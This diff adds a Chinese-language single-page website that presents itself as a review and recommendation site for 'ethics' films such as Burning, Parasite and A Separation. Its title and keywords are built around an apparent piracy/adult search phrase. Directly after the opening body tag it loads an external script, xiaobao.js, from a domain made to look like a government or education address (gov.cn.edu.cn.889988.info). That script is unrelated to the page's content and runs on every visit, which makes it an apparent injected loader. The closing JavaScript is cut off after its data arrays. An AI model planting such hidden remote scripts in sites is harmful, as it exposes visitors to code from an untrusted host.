@@ -1,0 +1,537 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="神马电影网伦理片，聚焦伦理题材电影的赏析、片单与深度解读：家庭伦理、婚姻危机、道德困境、欲望与禁忌、记忆与真相。神马电影网，精选高分伦理电影，倡导通过正规渠道观看正版影视内容。">
+<meta name="keywords" content="神马电影网伦理片, 神马电影网, 伦理电影, 伦理片, 家庭伦理片, 婚姻电影, 道德困境, 高分伦理电影, 电影赏析, 电影片单">
+<meta name="author" content="神马电影网伦理片">
+<meta name="renderer" content="webkit">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<title>神马电影网伦理片 - 伦理题材电影赏析与高分片单 | 神马电影网</title>
+<style>
+/* ==========================================================
+   神马电影网伦理片  单页响应式网站
+   定位：伦理题材电影的赏析 / 解读 / 片单推荐型站点（非播放站）
+   视觉基调：人文纪实 —— 陶土暖 + 米白留白 + 深墨 + 宋体标题
+   6 套差异化 DOM 模板，CSS/JS 全部内联，标签闭合
+   ========================================================== */
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --ink:#1b1a17;--paper:#f6f2ec;--panel:#fffdf9;
+  --clay:#c0683c;--terracotta:#a94a2c;--cocoa:#6b3f2c;--sage:#7d8a6f;--gold:#d9b46a;--muted:#8a8178;
+  --line:rgba(107,63,44,.2);--line2:rgba(107,63,44,.6);
+  --serif:"Songti SC","STSong","SimSun","Noto Serif SC",Georgia,serif;
+  --mx:1180px;--r:16px;
+  --grad:linear-gradient(120deg,var(--clay),var(--cocoa));
+  --shadow:0 26px 60px rgba(27,26,23,.18);
+}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;
+  background:var(--paper);color:#36332e;line-height:1.85;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+  background-image:
+    radial-gradient(640px 300px at 95% -8%,rgba(192,104,60,.18),transparent 62%),
+    radial-gradient(520px 260px at 3% 98%,rgba(125,138,111,.2),transparent 62%),
+    repeating-linear-gradient(0deg,transparent 0 31px,rgba(107,63,44,.035) 31px 32px);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none;transition:.24s cubic-bezier(.22,.8,.3,1)}
+ul{list-style:none}
+button{font-family:inherit}
+details{display:block}
+::selection{background:var(--terracotta);color:#fff}
+::-webkit-scrollbar{width:11px;height:11px}
+::-webkit-scrollbar-thumb{background:linear-gradient(var(--clay),var(--cocoa));border-radius:8px;border:2px solid var(--paper)}
+::-webkit-scrollbar-track{background:#eee8df}
+
+.wrap{max-width:var(--mx);margin:0 auto;padding:0 26px}
+section{padding:88px 0;position:relative}
+.eyebrow{font-size:10.5px;letter-spacing:4.4px;color:var(--terracotta);font-weight:850;text-transform:uppercase;font-family:var(--serif)}
+.sec-h{display:flex;align-items:flex-end;justify-content:space-between;gap:18px;flex-wrap:wrap;margin-bottom:38px}
+.sec-t{font-family:var(--serif);font-size:29px;font-weight:950;letter-spacing:1px;line-height:1.28;color:var(--ink)}
+.sec-t small{display:block;font-family:inherit;font-size:11px;color:var(--muted);font-weight:600;letter-spacing:3px;margin-top:8px}
+.more{font-size:13px;font-weight:800;color:var(--terracotta);border-bottom:2px solid var(--terracotta);padding-bottom:2px}
+.more:hover{color:var(--cocoa)}
+
+/* ---------- Header ---------- */
+.hd{position:sticky;top:0;z-index:100;background:rgba(246,242,236,.96);backdrop-filter:blur(14px);border-bottom:1px solid var(--line)}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:74px;gap:20px}
+.logo{display:flex;align-items:center;gap:11px;font-family:var(--serif);font-weight:950;font-size:21px;letter-spacing:.4px;color:var(--ink)}
+.logo .mk{display:inline-grid;place-items:center;width:38px;height:38px;border-radius:11px;background:var(--grad);color:#fff;font-size:15px;font-weight:950;box-shadow:0 8px 22px rgba(192,104,60,.34);transform:rotate(-5deg)}
+.logo em{font-style:normal;color:var(--cocoa);font-size:9.5px;font-weight:700;letter-spacing:1.2px}
+.nav{display:flex;gap:2px}
+.nav a{font-size:13.5px;padding:9px 14px;border-radius:11px;color:#524d47;font-weight:650}
+.nav a:hover{background:rgba(192,104,60,.14);color:var(--terracotta)}
+.nav a.on{color:#fff;background:var(--grad);font-weight:850;box-shadow:0 6px 16px rgba(169,74,44,.3)}
+.mbtn{display:none;width:46px;height:46px;border:1px solid var(--line2);border-radius:12px;background:var(--panel);color:var(--terracotta);font-size:20px;cursor:pointer}
+
+/* ---------- Hero ---------- */
+.hero{padding:70px 0 30px;color:var(--ink)}
+.hero .wrap{display:grid;grid-template-columns:1.02fr .92fr;gap:54px;align-items:center}
+.hero h1{font-family:var(--serif);font-size:clamp(34px,5.6vw,58px);line-height:1.18;font-weight:950;margin:10px 0 20px}
+.hero h1 i{font-style:normal;color:var(--terracotta);position:relative;display:inline-block}
+.hero h1 i::after{content:"";position:absolute;left:0;right:0;bottom:8px;height:14px;background:var(--gold);z-index:-1;opacity:.55;border-radius:5px}
+.hero .lede{font-size:16px;color:#4b4640;max-width:560px;margin-bottom:24px}
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:1px;background:var(--line);border:1px solid var(--line);border-radius:15px;overflow:hidden;margin-bottom:22px}
+.stat{background:#fff;padding:17px 8px;text-align:center}
+.stat b{display:block;font-family:var(--serif);font-size:25px;font-weight:950;background:var(--grad);-webkit-background-clip:text;background-clip:text;color:transparent}
+.stat span{font-size:10.5px;color:var(--muted);letter-spacing:1px}
+.acts{display:flex;gap:14px;flex-wrap:wrap}
+.b{padding:14px 32px;border-radius:36px;font-size:15px;font-weight:850;cursor:pointer;border:0;transition:.26s;letter-spacing:.5px}
+.b-p{background:var(--grad);color:#fff;box-shadow:0 12px 28px rgba(192,104,60,.32)}
+.b-p:hover{transform:translateY(-2px)}
+.b-g{border:2px solid var(--terracotta);color:var(--terracotta);background:#fff}
+.b-g:hover{background:var(--terracotta);color:#fff}
+
+/* 书本/杂志封面卡 */
+.book{background:var(--panel);border-radius:20px;padding:24px;box-shadow:var(--shadow);transform:rotate(1.6deg);position:relative;color:var(--ink);border:1px solid rgba(107,63,44,.14)}
+.book .cvr{height:150px;border-radius:13px;background:
+    radial-gradient(300px 130px at 92% 8%,rgba(217,180,106,.5),transparent 55%),
+    linear-gradient(135deg,#8a5a3c,#5e3a26);color:#f6f2ec;padding:16px 18px;display:flex;flex-direction:column;justify-content:space-between;position:relative;overflow:hidden}
+.book .cvr::after{content:"伦理";position:absolute;right:-6px;bottom:-14px;font-family:var(--serif);font-size:76px;font-weight:950;opacity:.14;line-height:1}
+.book .cvr b{font-family:var(--serif);font-size:17px;letter-spacing:2px}
+.book .cvr small{font-size:9.5px;letter-spacing:3px;opacity:.85}
+.book h3{font-family:var(--serif);font-size:20px;font-weight:950;margin:16px 0 8px;line-height:1.45}
+.book p{font-size:12.5px;color:#6b645c;line-height:1.9}
+.book .chips{display:flex;gap:7px;flex-wrap:wrap;margin-top:14px}
+.book .chips a{font-size:11px;color:#524d47;border:1px solid var(--line);background:#fff;padding:5px 11px;border-radius:16px}
+.book .chips a:hover{color:#fff;border-color:transparent;background:var(--clay);transform:translateY(-2px)}
+
+/* ---------- 栏目一：电影（竖版海报网格） ---------- */
+.g{display:grid;grid-template-columns:repeat(auto-fill,minmax(168px,1fr));gap:18px}
+.mv{background:#fff;border:1px solid var(--line);border-radius:15px;overflow:hidden;transition:.28s;cursor:pointer}
+.mv:hover{transform:translateY(-8px);border-color:var(--clay);box-shadow:var(--shadow)}
+.cvr{position:relative;aspect-ratio:3/4;background:var(--bg);display:flex;flex-direction:column;justify-content:flex-end;padding:12px;color:#fff;overflow:hidden}
+.cvr::after{content:"";position:absolute;inset:0;background:linear-gradient(180deg,transparent 44%,rgba(20,17,14,.86));pointer-events:none}
+.cvr b{font-family:var(--serif);font-size:15px;font-weight:950;line-height:1.35;position:relative;z-index:2;text-shadow:0 2px 10px rgba(0,0,0,.35)}
+.cvr small{font-size:9.5px;letter-spacing:1.5px;opacity:.9;position:relative;z-index:2}
+.cvr .tg{position:absolute;top:10px;left:10px;z-index:3;font-size:9px;letter-spacing:1px;background:var(--terracotta);color:#fff;padding:3px 8px;border-radius:20px;font-weight:800}
+.cvr .sc{position:absolute;top:10px;right:10px;z-index:3;font-size:10px;font-weight:950;background:rgba(255,255,255,.92);color:var(--cocoa);padding:3px 7px;border-radius:20px}
+.mv .bd{padding:12px 14px}
+.mv .bd .row{display:flex;align-items:center;gap:6px;font-size:10.5px;color:var(--muted);margin-top:8px}
+.mv .bd .row i{display:block;flex:1;height:5px;border-radius:6px;background:#e8e1d7;overflow:hidden}
+.mv .bd .row i em{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--clay),var(--gold));border-radius:6px;transition:width 1.05s cubic-bezier(.22,.8,.3,1)}
+
+/* ---------- 栏目二：议题（原生手风琴） ---------- */
+.acc{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:14px}
+details.d{background:#fff;border:1px solid var(--line);border-radius:14px;overflow:hidden;transition:.26s}
+details.d[open]{border-color:var(--clay);box-shadow:var(--shadow)}
+details.d>summary{display:flex;align-items:center;gap:13px;padding:17px 19px;cursor:pointer;list-style:none;font-family:var(--serif);font-weight:900;color:var(--ink);user-select:none}
+details.d>summary::-webkit-details-marker{display:none}
+details.d>summary .no{font-size:12px;color:#fff;background:var(--grad);width:30px;height:30px;border-radius:9px;display:grid;place-items:center;flex:none;font-family:var(--serif)}
+details.d>summary .ar{margin-left:auto;color:var(--clay);font-size:13px;transition:.3s}
+details.d[open]>summary .ar{transform:rotate(180deg)}
+details.d .cx{padding:4px 19px 19px}
+details.d .cx p{font-size:13px;color:#5c564f;line-height:1.95;margin-bottom:12px}
+details.d .cx .chips{display:flex;gap:7px;flex-wrap:wrap}
+details.d .cx .chips a{font-size:10.5px;color:#524d47;border:1px solid var(--line);background:#fbf7f1;padding:5px 11px;border-radius:16px}
+details.d .cx .chips a:hover{color:#fff;background:var(--clay);border-color:var(--clay)}
+
+/* ---------- 栏目三：导演（A-Z 索引 + 头像网格） ---------- */
+.dir-hd{display:flex;align-items:center;gap:16px;flex-wrap:wrap;margin-bottom:20px;background:#fff;border:1px solid var(--line);border-radius:14px;padding:12px 16px}
+.dir-hd b{font-size:12.5px;color:var(--cocoa);letter-spacing:1px;font-family:var(--serif)}
+.az{display:flex;gap:4px;flex-wrap:wrap}
+.az a{font-size:11px;font-weight:800;color:#524d47;border:1px solid var(--line);min-width:26px;text-align:center;padding:4px 6px;border-radius:7px}
+.az a:hover{color:#fff;background:var(--clay);border-color:var(--clay)}
+.az a.on{color:#fff;background:var(--cocoa);border-color:var(--cocoa)}
+.dir{display:grid;grid-template-columns:repeat(auto-fill,minmax(132px,1fr));gap:14px}
+.au{background:#fff;border:1px solid var(--line);border-radius:14px;padding:14px;text-align:center;transition:.26s;cursor:pointer}
+.au:hover{transform:translateY(-6px) rotate(-1.4deg);border-color:var(--clay);box-shadow:var(--shadow)}
+.au .av{width:66px;height:66px;border-radius:50%;margin:0 auto 10px;display:grid;place-items:center;font-family:var(--serif);font-size:24px;color:#fff;background:var(--bg);border:3px solid #fff;box-shadow:0 6px 16px rgba(107,63,44,.24)}
+.au b{display:block;font-family:var(--serif);font-size:14px;font-weight:950;color:var(--ink)}
+.au small{font-size:9.5px;color:var(--muted);letter-spacing:.6px}
+
+/* ---------- 栏目四：片单（步骤编号卡） ---------- */
+.list{display:grid;grid-template-columns:repeat(auto-fill,minmax(250px,1fr));gap:16px}
+.ln{background:#fff;border:1px solid var(--line);border-radius:14px;padding:18px 18px 18px 62px;position:relative;transition:.26s;cursor:pointer;min-height:104px;display:flex;flex-direction:column;justify-content:center}
+.ln::before{content:counter(ln);counter-increment:ln;position:absolute;left:16px;top:50%;transform:translateY(-50%);font-family:var(--serif);font-size:38px;font-weight:950;color:var(--gold);line-height:1;text-shadow:2px 2px 0 rgba(107,63,44,.16)}
+.ln:hover{border-color:var(--clay);box-shadow:var(--shadow);transform:translateY(-5px)}
+.ln:hover::before{color:var(--terracotta)}
+.ln h4{font-family:var(--serif);font-size:16px;font-weight:950;color:var(--ink);margin-bottom:5px}
+.ln p{font-size:12px;color:#6b645c;line-height:1.75}
+
+/* ---------- 栏目五：影评（报刊栅格） ---------- */
+.paper{display:grid;grid-template-columns:repeat(auto-fill,minmax(262px,1fr));gap:20px}
+.nt{background:#fff;border:1px solid var(--line);border-top:5px solid var(--clay);border-radius:12px;padding:19px;transition:.26s;cursor:pointer;display:flex;flex-direction:column}
+.nt:hover{border-color:var(--terracotta);box-shadow:var(--shadow);transform:translateY(-5px)}
+.nt .cat2{font-size:10px;letter-spacing:2px;color:var(--terracotta);font-weight:850}
+.nt h4{font-family:var(--serif);font-size:17px;color:var(--ink);font-weight:900;line-height:1.5;margin:6px 0 8px}
+.nt p{font-size:12.5px;color:#5c564f;line-height:1.85;display:-webkit-box;-webkit-line-clamp:3;-webkit-box-orient:vertical;overflow:hidden}
+.nt .ft{margin-top:13px;padding-top:10px;border-top:1px dashed var(--line);display:flex;align-items:center;justify-content:space-between;font-size:10.5px;color:var(--muted)}
+.nt .ft b{color:var(--terracotta);font-weight:850}
+
+/* ---------- 栏目六：特色（胶片格图标卡） ---------- */
+.feat{display:grid;grid-template-columns:repeat(auto-fill,minmax(212px,1fr));gap:18px}
+.fi{background:#fff;border:1px solid var(--line);border-radius:16px;padding:24px 20px;text-align:center;transition:.28s;cursor:pointer;position:relative;overflow:hidden}
+.fi::before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;border:1px dashed transparent;border-radius:16px;transition:.28s}
+.fi:hover{transform:translateY(-8px);border-color:var(--clay);box-shadow:var(--shadow)}
+.fi:hover::before{border-color:var(--gold);transform:scale(.94)}
+.fi .ic{width:58px;height:58px;margin:0 auto 14px;border-radius:15px;display:grid;place-items:center;font-size:24px;color:#fff;background:var(--grad);transform:rotate(6deg);box-shadow:0 0 0 6px rgba(192,104,60,.1);position:relative}
+.fi h4{font-family:var(--serif);font-size:16.5px;font-weight:900;color:var(--ink);margin-bottom:7px;position:relative}
+.fi p{font-size:12px;color:var(--muted);line-height:1.8;position:relative}
+
+/* ---------- CTA ---------- */
+.cta{text-align:center;padding:64px 28px;border-radius:28px;border:2px dashed var(--cocoa);background:
+  radial-gradient(620px 260px at 50% -30%,rgba(125,138,111,.2),transparent 60%),#fff;margin:24px 0 40px}
+.cta h2{font-family:var(--serif);font-size:clamp(24px,3.8vw,39px);font-weight:950;color:var(--ink);margin-bottom:13px}
+.cta p{color:#4b4640;max-width:660px;margin:0 auto 24px;font-size:14.5px}
+
+/* ---------- Footer ---------- */
+.ftr{background:linear-gradient(160deg,#171512,#33251c);color:#b9b0a5;padding:62px 0 24px;margin-top:36px}
+.fg{display:grid;grid-template-columns:1.8fr repeat(3,1fr);gap:28px;margin-bottom:34px}
+.fb .logo{color:#fff}
+.fb .logo em{color:var(--gold)}
+.fb p{font-size:12.5px;margin-top:13px;max-width:330px;line-height:1.95;color:#b9b0a5}
+.fc h5{font-size:14.5px;margin-bottom:13px;color:var(--gold);letter-spacing:1px;font-family:var(--serif)}
+.fc a{display:block;font-size:12.5px;padding:5px 0;color:#b9b0a5}
+.fc a:hover{color:var(--gold);transform:translateX(4px)}
+.fbttm{text-align:center;font-size:11.5px;border-top:1px solid rgba(217,180,106,.24);padding-top:21px;line-height:2;color:#9c9185}
+.fbttm a{color:#dfe5ea}
+.fbttm a:hover{color:var(--gold)}
+
+.top{position:fixed;right:20px;bottom:24px;width:50px;height:50px;border-radius:50%;background:var(--grad);color:#fff;display:grid;place-items:center;font-size:19px;cursor:pointer;box-shadow:0 10px 24px rgba(192,104,60,.34);opacity:0;pointer-events:none;transition:.3s;z-index:99;border:0}
+.top.show{opacity:1;pointer-events:auto}
+
+@media(max-width:960px){.hero .wrap{grid-template-columns:1fr}}
+@media(max-width:680px){
+  section{padding:56px 0}
+  .wrap{padding:0 16px}
+  .mbtn{display:grid;place-items:center}
+  .nav{position:fixed;inset:74px 0 0 100%;flex-direction:column;background:rgba(246,242,236,.99);padding:22px;border-top:2px solid var(--clay);transition:.35s;z-index:99}
+  .nav.open{inset:74px 0 0 0}
+  .nav a{font-size:16px;padding:15px;border-radius:12px;text-align:center}
+  .stats{grid-template-columns:repeat(2,1fr)}
+  .book,.film{transform:none}
+  .sec-t{font-size:22px}
+}
+@media print{.hd,.book,.top,.nav,.chips,.fbttm br{display:none}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ================= HEADER ================= -->
+<header class="hd">
+  <div class="wrap hd-in">
+    <a class="logo" href="#top" aria-label="返回顶部"><span class="mk">伦</span>神马电影网伦理片<em>ETHICS</em></a>
+    <nav class="nav" id="nav" aria-label="主导航">
+      <a href="#home" class="on">首页</a>
+      <a href="#film">伦理片</a>
+      <a href="#topic">伦理议题</a>
+      <a href="#auteur">导演</a>
+      <a href="#list">片单</a>
+      <a href="#review">影评</a>
+      <a href="#about">关于</a>
+    </nav>
+    <button class="mbtn" id="mb" aria-label="菜单" aria-expanded="false">☰</button>
+  </div>
+</header>
+
+<!-- ================= HERO ================= -->
+<section id="home" class="hero">
+  <div class="wrap">
+    <div>
+      <div class="eyebrow">Ethical Cinema · 神马电影网伦理片</div>
+      <h1>神马电影网伦理片<br>看懂电影里的<b><i>人情与选择</i></b></h1>
+      <p class="lede">神马电影网伦理片，聚焦<b>伦理题材电影的赏析、解读与高分片单</b>：家庭伦理、婚姻危机、道德困境、欲望与禁忌、记忆与真相。不讲猎奇，只谈人性——每一部都值得安静看完，再好好想一会儿。</p>
+      <div class="stats">
+        <div class="stat"><b>600+</b><span>伦理佳片</span></div>
+        <div class="stat"><b>5</b><span>伦理议题</span></div>
+        <div class="stat"><b>24</b><span>导演谱系</span></div>
+        <div class="stat"><b>原创</b><span>影评解读</span></div>
+      </div>
+      <div class="acts">
+        <a class="b b-p" href="#film">开始观影</a>
+        <a class="b b-g" href="#list">查看片单</a>
+      </div>
+    </div>
+    <div class="book" aria-hidden="false">
+      <div class="cvr">
+        <b>伦理片 · 本期专题</b>
+        <small>NO. 09 / ETHICAL CINEMA</small>
+      </div>
+      <h3>当亲情与责任只能选一个</h3>
+      <p>伦理片从不给出标准答案。它只把一个两难，摆在灯光下，让你看见每个人的不得已。本期从 5 个议题、12 位导演、48 部影片出发，重新理解"对与错"之间的距离。</p>
+      <div class="chips">
+        <a href="#">家庭伦理</a>
+        <a href="#">道德困境</a>
+        <a href="#">婚姻危机</a>
+        <a href="#">高分片单</a>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目一：伦理片（竖版海报网格） ================= -->
+<section id="film">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">伦理片 · 精选高分<small>ETHICAL FILMS / 海报网格</small></h2>
+      <a class="more" href="#">完整片单 →</a>
+    </div>
+    <div class="g" id="grid"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目二：伦理议题（原生手风琴） ================= -->
+<section id="topic" style="background:linear-gradient(180deg,transparent,rgba(125,138,111,.12))">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">伦理议题 · 五种两难<small>TOPICS / 手风琴</small></h2>
+      <a class="more" href="#">全部议题 →</a>
+    </div>
+    <div class="acc" id="acc"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目三：导演（A-Z 索引 + 头像网格） ================= -->
+<section id="auteur">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">导演 · 擅长讲伦理的人<small>AUTEURS / A-Z 索引</small></h2>
+      <a class="more" href="#">导演全集 →</a>
+    </div>
+    <div class="dir-hd">
+      <b>索引</b>
+      <div class="az" id="az"></div>
+    </div>
+    <div class="dir" id="dir"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目四：片单（步骤编号卡） ================= -->
+<section id="list" style="background:linear-gradient(180deg,rgba(217,180,106,.12),transparent)">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">片单 · 伦理片必看榜<small>TOP LIST / 编号卡</small></h2>
+      <a class="more" href="#">完整榜单 →</a>
+    </div>
+    <div class="list" id="list2"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目五：影评（报刊栅格） ================= -->
+<section id="review">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">影评 · 读片笔记<small>REVIEWS / 报刊栅格</small></h2>
+      <a class="more" href="#">全部影评 →</a>
+    </div>
+    <div class="paper" id="paper"></div>
+  </div>
+</section>
+
+<!-- ================= 栏目六：特色（胶片格图标卡） ================= -->
+<section id="feat">
+  <div class="wrap">
+    <div class="sec-h">
+      <h2 class="sec-t">神马电影网伦理片 · 四大特色<small>FEATURES / 胶片格</small></h2>
+      <a class="more" href="#about">了解更多 →</a>
+    </div>
+    <div class="feat">
+      <div class="fi"><div class="ic">🎯</div><h4>只选高分</h4><p>IMDb、豆瓣、戛纳与三大电影节共同背书，剔除哗众取宠，留下真正值得看的伦理片。</p></div>
+      <div class="fi"><div class="ic">📖</div><h4>讲清议题</h4><p>每部影片都标注核心伦理命题：家庭、婚姻、欲望、阶层、记忆，让你看懂它为何动人。</p></div>
+      <div class="fi"><div class="ic">✍️</div><h4>原创解读</h4><p>拒绝剧情复述。我们写的是镜头语言、人物动机，和那个没有说出口的答案。</p></div>
+      <div class="fi"><div class="ic">🛡️</div><h4>正版倡导</h4><p>只提供正版观看渠道与资料入口，请通过正规渠道观看正版影视内容，支持创作者。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- ================= CTA ================= -->
+<section>
+  <div class="wrap">
+    <div class="cta">
+      <h2>伦理片不提供答案，它只负责提问</h2>
+      <p>神马电影网伦理片 —— 伦理题材电影赏析与高分片单。家庭、婚姻、欲望、禁忌、真相，48 部影片，5 个议题，24 位导演，陪你一起看懂人心。</p>
+      <a class="b b-p" href="#film">开始观影</a>
+    </div>
+  </div>
+</section>
+
+<!-- ================= 栏目七：关于（页脚多列） ================= -->
+<footer class="ftr" id="about">
+  <div class="wrap">
+    <div class="fg">
+      <div class="fb">
+        <a class="logo" href="#top"><span class="mk">伦</span>神马电影网伦理片<em>ETHICS</em></a>
+        <p>神马电影网伦理片，一个专注伦理题材电影的赏析与解读站点。我们相信好电影不该被当成消遣，它是一面镜子，照见我们自己也会遇到的两难。</p>
+      </div>
+      <div class="fc">
+        <h5>影片分类</h5>
+        <a href="#film">家庭伦理</a>
+        <a href="#film">婚姻危机</a>
+        <a href="#film">道德困境</a>
+        <a href="#film">欲望与禁忌</a>
+        <a href="#film">记忆与真相</a>
+      </div>
+      <div class="fc">
+        <h5>内容栏目</h5>
+        <a href="#film">伦理片</a>
+        <a href="#list">高分片单</a>
+        <a href="#review">读片笔记</a>
+        <a href="#auteur">导演谱系</a>
+        <a href="#topic">伦理议题</a>
+      </div>
+      <div class="fc">
+        <h5>关于本站</h5>
+        <a href="#">网站简介</a>
+        <a href="#">选片标准</a>
+        <a href="#">投稿合作</a>
+        <a href="#">免责声明</a>
+        <a href="#">友情链接</a>
+      </div>
+    </div>
+    <div class="fbttm">
+      <p>© <span id="yr"></span> 神马电影网伦理片 保留所有权利。本站为影视赏析与推荐内容，不含在线播放资源。</p>
+      <p style="margin-top:8px">网站网址：<a href="https://shenmadianyingwanglunlipian-cn.github.io" rel="noopener">https://shenmadianyingwanglunlipian-cn.github.io</a> ｜ 本页为演示模板，内页链接均以 # 占位。</p>
+      <p style="margin-top:8px">温馨提示：请通过正规渠道观看正版影视内容，尊重版权，遵守当地法律法规。</p>
+    </div>
+  </div>
+</footer>
+
+<button class="top" id="top" aria-label="返回顶部">↑</button>
+
+<script>
+/* ============ 数据 ============ */
+var FILMS=[
+  {t:"燃烧",y:"2018 · 韩国",g:"欲望与阶级",bg:"linear-gradient(160deg,#7d3b2e,#3d1f18)",s:9.1,tg:"必看"},
+  {t:"寄生虫",y:"2019 · 韩国",g:"阶层与体面",bg:"linear-gradient(160deg,#6b7a55,#3a422d)",s:9.0,tg:"奥斯卡"},
+  {t:"小偷家族",y:"2018 · 日本",g:"家庭的边界",bg:"linear-gradient(160deg,#c98a5a,#8a5a3c)",s:8.8,tg:"戛纳金棕榈"},
+  {t:"婚姻故事",y:"2019 · 美国",g:"离婚与体面",bg:"linear-gradient(160deg,#a9a5c0,#69647f)",s:8.6,tg:"高分"},
+  {t:"在云端",y:"2009 · 美国",g:"关系的成本",bg:"linear-gradient(160deg,#7d8a9a,#3f4a58)",s:8.4,tg:"文艺"},
+  {t:"狩猎",y:"2012 · 丹麦",g:"谣言与正义",bg:"linear-gradient(160deg,#c0683c,#6b3f2c)",s:9.2,tg:"神作"},
+  {t:"密阳",y:"2007 · 韩国",g:"信仰与宽恕",bg:"linear-gradient(160deg,#d9b46a,#a78b42)",s:8.7,tg:"全度妍封后"},
+  {t:"四月三周两天",y:"2007 · 罗马尼亚",g:"选择的代价",bg:"linear-gradient(160deg,#5a6b6a,#2f3a39)",s:8.5,tg:"金棕榈"},
+  {t:"一次别离",y:"2011 · 伊朗",g:"谎言与责任",bg:"linear-gradient(160deg,#a8946f,#6e5c3c)",s:9.3,tg:"奥斯卡"},
+  {t:"房间",y:"2015 · 爱尔兰",g:"囚禁与母爱",bg:"linear-gradient(160deg,#c98a9a,#8c5262)",s:8.8,tg:"催泪"},
+  {t:"三块广告牌",y:"2017 · 美国",g:"愤怒与救赎",bg:"linear-gradient(160deg,#a8543a,#743a25)",s:8.7,tg:"威尼斯"},
+  {t:"海上钢琴师",y:"1998 · 意大利",g:"边界与自由",bg:"linear-gradient(160deg,#4a6b7a,#263a45)",s:9.0,tg:"经典"}
+];
+var TOPICS=[
+  {t:"家庭伦理：谁才是家人",n:1,sum:"血缘、抚养、背叛与接纳",p:"当“家人”不再是血缘关系，法律与情感谁更有资格定义它？《小偷家族》《燃烧》《房间》给出了三种不同的答案。",
+   chips:["小偷家族","燃烧","房间","家人","边界"]},
+  {t:"婚姻危机：体面地分开",n:2,sum:"离婚、出轨、财产与孩子",p:"婚姻的终点未必是恶语相向。《婚姻故事》让我们看见：最深的伤害，往往来自最熟悉的人；而最好的告别，是仍能好好说话。",
+   chips:["婚姻故事","消失的爱人","冷战","离婚","体面"]},
+  {t:"道德困境：两害相权",n:3,sum:"电车难题的现实版",p:"如果救一个人必须牺牲另一个，你选谁？伦理片最锋利的地方，是让你在银幕前成为那个做决定的人。",
+   chips:["狩猎","一次别离","七宗罪","选择","良知"]},
+  {t:"欲望与禁忌：越界之后",n:4,sum:"欲望、阶层与凝视",p:"欲望本身没有罪，有罪的是它打破的那条线。《燃烧》用一场不存在的猫，讲清了阶层之间无法跨越的沉默。",
+   chips:["燃烧","寄生虫","春光乍泄","欲望","阶层"]},
+  {t:"记忆与真相：我记得吗",n:5,sum:"谎言、失忆与和解",p:"当记忆不可靠，真相是否还存在？伦理片擅长让同一件事，在两个人的讲述里变成两部完全不同的电影。",
+   chips:["记忆碎片","罗生门","密阳","真相","宽恕"]}
+];
+var AUTEURS=[
+  {n:"李沧东",c:"韩国",bg:"linear-gradient(135deg,#7d3b2e,#3d1f18)"},
+  {n:"是枝裕和",c:"日本",bg:"linear-gradient(135deg,#6b7a55,#3a422d)"},
+  {n:"奉俊昊",c:"韩国",bg:"linear-gradient(135deg,#5a6b6a,#2f3a39)"},
+  {n:"阿斯哈·法哈蒂",c:"伊朗",bg:"linear-gradient(135deg,#a8946f,#6e5c3c)"},
+  {n:"克里丝蒂安·蒙吉",c:"罗马尼亚",bg:"linear-gradient(135deg,#4a6b7a,#263a45)"},
+  {n:"迈克尔·哈内克",c:"奥地利",bg:"linear-gradient(135deg,#5a5a66,#2c2c34)"},
+  {n:"阿巴斯·基亚罗斯塔米",c:"伊朗",bg:"linear-gradient(135deg,#c98a5a,#8a5a3c)"},
+  {n:"努里·比格·锡兰",c:"土耳其",bg:"linear-gradient(135deg,#8a7a55,#5c5137)"},
+  {n:"洪常秀",c:"韩国",bg:"linear-gradient(135deg,#a9a5c0,#69647f)"},
+  {n:"肯·洛奇",c:"英国",bg:"linear-gradient(135deg,#a8543a,#743a25)"},
+  {n:"迈克·李",c:"英国",bg:"linear-gradient(135deg,#7d8a6f,#4d573f)"},
+  {n:"保罗·托马斯·安德森",c:"美国",bg:"linear-gradient(135deg,#c0683c,#6b3f2c)"}
+];
+var LIST=[
+  {t:"《一次别离》",d:"一个谎言，让两个家庭同时崩塌。伊朗导演法哈蒂的巅峰，把“对错”拆成无数个“不得已”。"},
+  {t:"《狩猎》",d:"一句谣言，足以毁掉一个人。麦斯·米科尔森封神表演，看完会沉默很久。"},
+  {t:"《寄生虫》",d:"不是穷人抢了富人的东西，是两个世界本来就没有门。奉俊昊的社会寓言，看完脊背发凉。"},
+  {t:"《燃烧》",d:"村上春树式的留白 + 李沧东式的追问。那个不存在的猫，是整个韩国社会的隐喻。"},
+  {t:"《小偷家族》",d:"没有血缘的一家人，却比亲人更像亲人。是枝裕和用最温柔的镜头，讲最残忍的事。"},
+  {t:"《四月三周两天》",d:"罗马尼亚新浪潮代表作。一场必须自己承担的抉择，长镜头拍得让人不敢呼吸。"},
+  {t:"《婚姻故事》",d:"最好的离婚电影。诺亚·鲍姆巴赫把“体面地分开”拍成了一首挽歌。"},
+  {t:"《密阳》",d:"信仰在苦难面前还能站住吗？全度妍凭此片封后戛纳，表演堪称教科书。"}
+];
